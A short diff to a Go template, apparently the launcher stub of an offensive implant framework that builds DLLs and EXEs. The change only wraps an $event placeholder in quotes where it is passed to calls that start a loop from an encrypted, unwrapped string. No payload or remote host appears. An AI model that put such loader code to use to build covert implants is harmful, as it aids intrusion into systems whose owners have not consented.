@@ -48,7 +48,7 @@ func main() {
 	if len(os.Args) > 2 {
 		flurry.Loop(
 			time.Second*time.Duration($period), $critical,
-			man.LinkerFromName($event), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
+			man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 		)
 	} else {
 		// BUG(dij): COM DLLs seem to crash?
@@ -56,7 +56,7 @@ func main() {
 		//           A workaround for now is to disable critical on non-loop
 		//           DLLs and EXEs (since they die anyway).
 		flurry.Start(
-			false, man.LinkerFromName($event), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
+			false, man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 		)
 	}
 }
@@ -68,6 +68,6 @@ func secondary() {
 	}
 	flurry.Loop(
 		time.Second*time.Duration($period), $critical,
-		man.LinkerFromName($event), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
+		man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 	)
 }
